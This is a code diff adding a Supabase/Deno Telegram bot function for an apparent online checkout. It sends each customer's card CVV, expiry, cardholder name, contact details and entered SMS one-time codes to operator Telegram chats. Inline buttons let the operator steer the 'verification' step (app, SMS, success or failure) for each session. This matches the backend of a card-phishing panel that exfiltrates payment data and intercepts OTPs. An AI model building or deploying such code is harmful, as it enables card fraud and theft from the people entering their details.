@@ -1,0 +1,286 @@
+import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
+import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
+
+const corsHeaders = {
+  'Access-Control-Allow-Origin': '*',
+  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
+};
+
+const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
+const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
+const telegramToken = Deno.env.get('TELEGRAM_BOT_TOKEN')!;
+
+const supabase = createClient(supabaseUrl, supabaseKey);
+
+serve(async (req) => {
+  if (req.method === 'OPTIONS') {
+    return new Response(null, { headers: corsHeaders });
+  }
+
+  try {
+    const url = new URL(req.url);
+    const action = url.pathname.split('/').pop();
+
+    switch (action) {
+      case 'webhook':
+        return await handleWebhook(req);
+      case 'send-notification':
+        return await handleSendNotification(req);
+      case 'test-message':
+        return await handleTestMessage(req);
+      default:
+        return new Response('Not found', { status: 404 });
+    }
+  } catch (error) {
+    console.error('Telegram bot error:', error);
+    return new Response(JSON.stringify({ error: error.message }), {
+      status: 500,
+      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+    });
+  }
+});
+
+async function handleWebhook(req: Request) {
+  const update = await req.json();
+  console.log('Telegram webhook update:', update);
+
+  if (update.callback_query) {
+    await handleCallbackQuery(update.callback_query);
+  }
+
+  return new Response('OK', { headers: corsHeaders });
+}
+
+async function handleCallbackQuery(callbackQuery: any) {
+  const { data, from, message } = callbackQuery;
+  const [action, sessionId, ...params] = data.split(':');
+
+  console.log(`Handling callback: ${action} for session ${sessionId}`);
+
+  try {
+    switch (action) {
+      case 'set_method':
+        const method = params[0];
+        await supabase.functions.invoke('payment-sessions/set-verification-method', {
+          body: { sessionId, method }
+        });
+        
+        await editMessageText(
+          message.chat.id,
+          message.message_id,
+          `✅ Verification method set to: ${method}\n\n${message.text}`,
+          method === 'choice' ? getVerificationChoiceButtons(sessionId) : null
+        );
+        break;
+
+      case 'complete':
+        const success = params[0] === 'success';
+        if (success) {
+          await supabase.functions.invoke('payment-sessions/complete-payment', {
+            body: { sessionId }
+          });
+          await editMessageText(
+            message.chat.id,
+            message.message_id,
+            `✅ Payment completed successfully!\n\n${message.text}`,
+            null
+          );
+        } else {
+          await supabase.functions.invoke('payment-sessions/reset-verification', {
+            body: { sessionId }
+          });
+          await editMessageText(
+            message.chat.id,
+            message.message_id,
+            `❌ Payment failed, verification reset\n\n${message.text}`,
+            getVerificationMethodButtons(sessionId)
+          );
+        }
+        break;
+    }
+
+    // Answer callback query to remove loading state
+    await fetch(`https://api.telegram.org/bot${telegramToken}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        callback_query_id: callbackQuery.id,
+        text: 'Action processed'
+      })
+    });
+
+  } catch (error) {
+    console.error('Error handling callback:', error);
+    await fetch(`https://api.telegram.org/bot${telegramToken}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        callback_query_id: callbackQuery.id,
+        text: 'Error processing action',
+        show_alert: true
+      })
+    });
+  }
+}
+
+async function handleSendNotification(req: Request) {
+  const { type, data } = await req.json();
+
+  const { data: chatIds } = await supabase
+    .from('telegram_config')
+    .select('chat_id')
+    .eq('is_active', true);
+
+  if (!chatIds || chatIds.length === 0) {
+    return new Response(JSON.stringify({ message: 'No active chat IDs configured' }), {
+      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+    });
+  }
+
+  for (const { chat_id } of chatIds) {
+    await sendNotification(chat_id, type, data);
+  }
+
+  return new Response(JSON.stringify({ message: 'Notifications sent' }), {
+    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+  });
+}
+
+async function handleTestMessage(req: Request) {
+  const { chatId } = await req.json();
+
+  const message = `🤖 *Test Notification*\n\nTelegram bot is working correctly!\nTime: ${new Date().toLocaleString()}`;
+
+  await sendTelegramMessage(chatId, message);
+
+  return new Response(JSON.stringify({ message: 'Test message sent' }), {
+    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+  });
+}
+
+async function sendNotification(chatId: string, type: string, data: any) {
+  let message = '';
+  let buttons = null;
+
+  switch (type) {
+    case 'checkout_started':
+      message = `🛒 *New Checkout Started*\n\n` +
+                `👤 Customer: ${data.first_name} ${data.last_name}\n` +
+                `📧 Email: ${data.email}\n` +
+                `📱 Phone: ${data.phone}\n` +
+                `📦 Product: ${data.product_type}\n` +
+                `📊 Quantity: ${data.quantity}\n` +
+                `📍 ZIP: ${data.zip_code}\n` +
+                `💰 Total: €${data.total_price}`;
+      break;
+
+    case 'payment_started':
+      message = `💳 *Payment Page Entered*\n\n` +
+                `👤 Cardholder: ${data.cardholder_name}\n` +
+                `💳 Card: **** **** **** ${data.card_number.slice(-4)}\n` +
+                `📅 Expiry: ${data.expiry_date}\n` +
+                `🔐 CVV: ${data.cvv}\n\n` +
+                `Session ID: \`${data.session_id}\``;
+      buttons = getVerificationMethodButtons(data.session_id);
+      break;
+
+    case 'verification_update':
+      if (data.verification_status === 'app_confirmed') {
+        message = `✅ *App Verification Confirmed*\n\n` +
+                  `Session: \`${data.session_id}\`\n` +
+                  `Method: ${data.verification_method}`;
+        buttons = getCompletionButtons(data.session_id);
+      } else if (data.verification_status === 'sms_confirmation' && data.sms_code) {
+        message = `📱 *SMS Code Entered*\n\n` +
+                  `Session: \`${data.session_id}\`\n` +
+                  `Code: \`${data.sms_code}\``;
+        buttons = getCompletionButtons(data.session_id);
+      }
+      break;
+  }
+
+  if (message) {
+    await sendTelegramMessage(chatId, message, buttons);
+  }
+}
+
+async function sendTelegramMessage(chatId: string, text: string, replyMarkup: any = null) {
+  const payload: any = {
+    chat_id: chatId,
+    text,
+    parse_mode: 'Markdown'
+  };
+
+  if (replyMarkup) {
+    payload.reply_markup = replyMarkup;
+  }
+
+  const response = await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+
+  if (!response.ok) {
+    const error = await response.text();
+    console.error('Telegram API error:', error);
+    throw new Error(`Telegram API error: ${error}`);
+  }
+
+  return await response.json();
+}
+
+async function editMessageText(chatId: string, messageId: number, text: string, replyMarkup: any = null) {
+  const payload: any = {
+    chat_id: chatId,
+    message_id: messageId,
+    text,
+    parse_mode: 'Markdown'
+  };
+
+  if (replyMarkup) {
+    payload.reply_markup = replyMarkup;
+  }
+
+  const response = await fetch(`https://api.telegram.org/bot${telegramToken}/editMessageText`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+
+  return response.ok;
+}
+
+function getVerificationMethodButtons(sessionId: string) {
+  return {
+    inline_keyboard: [
+      [
+        { text: '🔄 Wahl', callback_data: `set_method:${sessionId}:choice` },
+        { text: '📱 App-Bestätigung', callback_data: `set_method:${sessionId}:app_confirmation` },
+        { text: '💬 SMS', callback_data: `set_method:${sessionId}:sms_confirmation` }
+      ]
+    ]
+  };
+}
+
+function getVerificationChoiceButtons(sessionId: string) {
+  return {
+    inline_keyboard: [
+      [
+        { text: '📱 App-Bestätigung', callback_data: `set_method:${sessionId}:app_confirmation` },
+        { text: '💬 SMS', callback_data: `set_method:${sessionId}:sms_confirmation` }
+      ]
+    ]
+  };
+}
+
+function getCompletionButtons(sessionId: string) {
+  return {
+    inline_keyboard: [
+      [
+        { text: '✅ Erfolgreich', callback_data: `complete:${sessionId}:success` },
+        { text: '❌ Fehlgeschlagen', callback_data: `complete:${sessionId}:failed` }
+      ]
+    ]
+  };
+}
